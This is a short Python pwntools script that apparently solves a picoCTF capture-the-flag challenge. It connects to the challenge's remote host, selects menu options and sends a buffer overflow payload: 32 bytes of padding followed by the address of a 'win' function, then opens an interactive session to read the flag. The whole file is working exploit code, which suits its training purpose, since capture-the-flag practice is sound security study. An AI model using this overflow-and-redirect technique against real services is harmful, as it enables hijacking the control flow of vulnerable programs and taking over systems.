from pwn import *
io = remote('mimas.picoctf.net', 53471)

io.sendlineafter(b"choice: ", b"2")

# Prepare the payload
win_addr = 0x4011a0
padding = b'A' * 32
payload = padding + p64(win_addr)

io.sendlineafter(b"buffer: ", payload)
io.sendlineafter(b"choice: ", b"4")

# Switch to interactive mode to see the flag printed
io.interactive()
